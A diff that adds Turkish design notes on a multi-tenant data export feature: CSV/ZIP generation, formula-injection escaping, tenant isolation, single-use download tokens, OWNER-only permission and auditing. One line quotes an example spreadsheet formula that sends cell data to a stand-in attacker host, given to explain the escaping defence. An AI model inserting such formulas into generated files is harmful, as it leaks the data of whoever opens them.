@@ -3375,6 +3375,142 @@ kabul kriterinin doğrulanabilir yarısıdır.
 - **`jwt` callback sorgusu değiştirilmedi.** Issue açıkça bunu şart koşuyordu; bağlantı
   yönetimi o sorguyu ucuzlatmaz, yalnızca yükünü taşınabilir kılar.
 
+## Tenant verisini dışa aktarma (Issue #194)
+
+"Verim bende kalır mı?" satış görüşmesinde sorulan bir sorudur; KVKK kapsamında veri
+taşınabilirliği ise bir haktır. Bugüne kadar bir tenant'ın verisini dışarı almanın hiçbir
+yolu yoktu.
+
+### Bağımlılık eklenmedi: CSV ve ZIP elle yazıldı
+
+CSV'nin zor kısmı alıntılama değil, aşağıdaki **formül enjeksiyonu** korumasıdır — ve bu bir
+CSV kütüphanesinin sorumluluğu değildir, çoğu yapmaz. ZIP'in ihtiyacımız olan kısmı ise
+küçüktür: yerel başlık + deflate + merkezî dizin; sıkıştırma zaten Node'da (`zlib`).
+
+**ZIP yazıcı gerçek araçlara karşı doğrulandı**, kendi okuyucumuza karşı değil: .NET
+`ZipFile` ve Windows `Expand-Archive` ile açıldı. Bu, geliştirme sırasında gerçek bir hatayı
+yakaladı — merkezî dizin girdilerinde **dosya adı yazılmıyordu** ve arşiv her araca **boş**
+görünüyordu. Kendi yazdığımız okuyucuyla test etseydik bu hata geçerdi.
+
+Bilinen sınırlar: **ZIP64 yok** (4 GB / 65535 dosya üstü), şifreleme yok. Sınırlar aşılırsa
+sessizce bozuk dosya üretmek yerine **fırlatılır**.
+
+### CSV formül enjeksiyonu
+
+`=`, `+`, `-`, `@` (ve sekme/satır başı) ile başlayan hücreleri Excel **formül** olarak
+çalıştırır. Kullanıcı bir kategoriye `=HYPERLINK("http://kotu.site?d="&A1,"Tıkla")` adını
+verirse, dosyayı açan kişi tıkladığında tablodaki veri saldırgana gider.
+
+**Bu bizim sorumluluğumuzdur**: dosyayı biz üretiyoruz ve bizim kullanıcımız açıyor.
+"Excel'in sorunu" demek, kendi ürettiğimiz dosyayı silah yapmak olurdu.
+
+Kaçırma **tek tırnakla** yapılır, silmeyle değil: Excel baştaki `'` karakterini "metin olarak ele
+al" direktifi sayar ve göstermez. Karakteri silmek veriyi bozardı — eksi işaretiyle başlayan
+meşru bir açıklama ("-500 düzeltmesi") sessizce değişirdi. Kaçırma **alıntılamadan önce**
+yapılır; tersi, eklenen tırnağı alıntının dışında bırakıp ayrıştırmayı bozardı.
+
+### Para STRING olarak yazılır
+
+`Decimal` → `Number` çevrimi kayan nokta yuvarlamasıdır (invariant #10). Ama asıl tehlike
+Excel'dedir: `1234.5600` hücresini sayıya çevirip sondaki sıfırları atar, büyük değerleri
+bilimsel gösterime kaydırır ve 15 basamaktan sonra **hassasiyet kaybeder**. Metin olarak
+yazılan değer, aktarıldığı andaki tam değeri taşır.
+
+Dosyalar **BOM'lu UTF-8** ve **CRLF**'tir: BOM olmadan Excel dosyayı sistem kod sayfasıyla
+açar ve Türkçe karakterler bozulur ("Kırtasiye" → "KÄ±rtasiye"). Standart ayrıştırıcılar
+BOM'u yok sayar, yani "hem Excel'de açılır hem makine okur" şartının ikisi de sağlanır.
+
+### Tenant izolasyonu: en kritik nokta
+
+`src/lib/export/tenant-data.ts` içindeki **her** sorgu `tenantScoped()` üzerinden geçer
+(invariant #1). Bir dışa aktarma dosyasına sızan tek bir yabancı satır, en kötü sınıftan bir
+ihlaldir: kalıcı bir dosyaya yazılır, kullanıcıya teslim edilir ve **geri alınamaz**.
+
+Testi bir **kontrol grubu** taşır: başka tenant'ın kimlikleri dosyada yok, ama kendi verisi
+**var** — aksi halde "boş dosya" da testi geçerdi.
+
+### Hangi alanlar dışarı çıkmaz
+
+Üye satırında e-posta, ad, rol ve katılma zamanı **vardır** (tenant'ın verisidir).
+`passwordHash`, `credentialsChangedAt`, `sessionsRevokedAt`, `emailVerified` **yoktur**: ilki bir
+sırdır, diğerleri kullanıcının GÜVENLİK durumudur ve tenant'ın verisi değildir — bir tenant
+sahibinin, üyesinin şifresini ne zaman değiştirdiğini öğrenmesi için hiçbir gerekçe yoktur.
+Davetlerde `tokenHash` de yoktur.
+
+Bunlar `include` ile değil **dar `select`** ile sağlanır: `include: { user: true }` yazmak,
+şemaya eklenecek her yeni kullanıcı alanını sessizce dosyaya taşırdı.
+
+### Üretim eşzamanlı değildir
+
+Büyük bir tenant'ta ZIP üretimi HTTP zaman aşımını aşar. İstek `PENDING` bir kayıt bırakır ve
+`202` döner; üretimi `POST /api/maintenance/data-exports` yapar — **#188'in getirdiği
+"platform cron'u bir bakım ucunu çağırır" deseninin aynısı**. Bu repo'da kuyruk altyapısı
+yoktur ve bir tane getirmek bu issue'nun kapsamı dışıdır.
+
+İş **atomik olarak sahiplenilir** (`PENDING → PROCESSING` koşullu `updateMany`): eşzamanlı iki
+bakım çağrısında aynı işi yalnızca biri alır. Dosya önce `.tmp`, sonra `rename` ile yazılır —
+yarıda kesilen bir iş, "hazır" sanılıp indirilebilecek yarım bir ZIP bırakmamalıdır.
+
+Aynı tenant için aynı anda **birden fazla bekleyen talep olamaz** (`409`): arka arkaya basılan
+bir düğme, aynı veriyi üreten onlarca iş ve onlarca kalıcı dosya bırakırdı.
+
+### 🔴 İndirme bir POST'tur — invariant gerilimi burada çözüldü
+
+Issue iki şey istiyordu: indirme bağlantısı **tek kullanımlık** olsun ve invariant #6'nın
+token desenine uysun. Ama tek kullanımlık olmak `downloadedAt`'i yazmak, yani bir **yan etki**
+demektir. Bunu bir GET'e koymak **invariant #4'ü** ("GET/HEAD yan etkisizdir") ihlal ederdi ve
+`integration/get-side-effect-free-pattern.spec.ts` haklı olarak kırmızıya dönerdi.
+
+**İnvariant gevşetilmedi; biçim değiştirildi.** İndirme `POST /api/exports/download`'dur.
+Kaybedilen tek şey adres çubuğuna yapıştırılabilen bir bağlantıdır; kazanılan şey hem tek
+kullanımlılık hem de yan etkisiz GET kuralının bozulmamasıdır.
+
+**Token gövdededir, URL'de değil:** URL'ler sunucu erişim loglarına, proxy loglarına ve
+tarayıcı geçmişine yazılır. Tenant'ın tüm verisini açan bir anahtarın oralarda durmaması
+gerekir.
+
+Uç **kimlik istemez** — token'ın kendisi yetkidir (şifre sıfırlama linkiyle aynı model);
+talebi yapan OWNER dosyayı başka bir cihazda açabilmelidir.
+
+"Bulunamadı" / "süresi doldu" / "zaten indirildi" **ayrıştırılmaz**, hepsi `404` (invariant #7).
+`409` yalnızca henüz hazır olmayan iş içindir ve bu bir sızıntı değildir: o token'ı yalnızca
+talebi yapan bilir ve "hazır mı" sorusunun cevabını görmesi akışın kendisidir.
+
+### Yetki OWNER-only
+
+Yeni izin `tenant:export`, `modules:manage` ve `tenant:update-settings` ile **aynı sınıfta**:
+dışa aktarma tenant'ın tüm verisini — üye e-postaları ve audit log dahil — tek bir dosyada
+dışarı çıkarır. Bir ADMIN'in günlük operasyon yetkisi bunu kapsamaz; bu bir **sahiplik**
+kararıdır.
+
+Rate limit `tenant:data-export` **2/saat**: üretim pahalıdır ve her çalışma kalıcı bir dosya
+bırakır. Sınırsız bırakmak, çalınmış bir OWNER oturumuyla diski doldurmanın ve aynı veriyi
+tekrar tekrar dışarı taşımanın yolu olurdu.
+
+### Audit: `TENANT_DATA_EXPORTED`
+
+Olay **indirme anında** yazılır, talep anında değil — veri asıl orada dışarı çıkar.
+"Veri sızdı mı, ne zaman, kim tarafından" sorusunun cevabı budur.
+
+Süresi dolan dosyalar silinir ama **kayıt korunur**: dosya diskte durmamalıdır, ama "ne zaman,
+kim tarafından dışa aktarıldı" bir audit sorusudur.
+
+### Kalan risk / kapsam dışı
+
+- **Arayüz yok.** Issue'nun kapsam listesinde UI maddesi yoktu; akış bugün yalnızca API
+  üzerinden kullanılabilir.
+- **Dosyalar YEREL DİSKTE.** `TENANT_EXPORT_DIR` ile yer değiştirilebilir, ama nesne deposuna
+  taşımak **#185**'in konusudur ve o hesap erişimi bekliyor. Bu dizin web sunucusu tarafından
+  **servis edilmemelidir**.
+- **Zamanlanmış iş kurulmadı** — `MAINTENANCE_SECRET`'ın ortama konmasını ve bir cron
+  tanımlanmasını gerektirir (#188 ile aynı durum).
+- **İçe aktarma yok** (Epic 10, #79). `manifest.json` `formatVersion` taşıyor ki o iş bu
+  biçimi okuyabilsin.
+- **Modül verisi genel değil:** bugün açık modüllerin kendi tabloları yok; `moduller.csv` hangi
+  modülün açık olduğunu taşır. CRM/Tahsilat modelleri geldiğinde bu dosya listesi genişletilmeli.
+- **Büyük tenant ölçülmedi:** ZIP tek seferde bellekte üretilir. Bugünkü veri boyutlarında
+  sorun değil, ama gigabaytlık bir tenant için akış (streaming) üretim gerekir.
+
 ## Yedekleme ve geri dönüş (Issue #185)
 
 > **RPO = 24 saat. RTO = 4 saat.**
